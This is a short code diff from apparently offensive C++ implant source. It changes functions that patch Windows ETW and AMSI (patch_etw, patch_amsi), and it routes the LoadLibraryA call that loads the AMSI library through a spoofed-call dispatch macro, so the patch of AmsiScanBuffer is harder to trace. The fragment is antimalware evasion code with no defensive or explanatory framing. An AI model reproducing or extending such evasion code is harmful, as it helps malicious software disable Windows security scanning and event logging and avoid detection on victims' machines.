@@ -1,6 +1,7 @@
 #include <common.h>
 #include <module.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)
 
@@ -166,7 +167,7 @@ static auto declfn patch_etw( instance& inst ) -> bool {
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
 static auto declfn patch_amsi( instance& inst ) -> bool {
     STK_AMSI(_n);
-    auto h_amsi = inst.kernel32.LoadLibraryA( _n );
+    auto h_amsi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_amsi ) return false;
 
     auto pAmsiScanBuffer = reinterpret_cast<void*>(
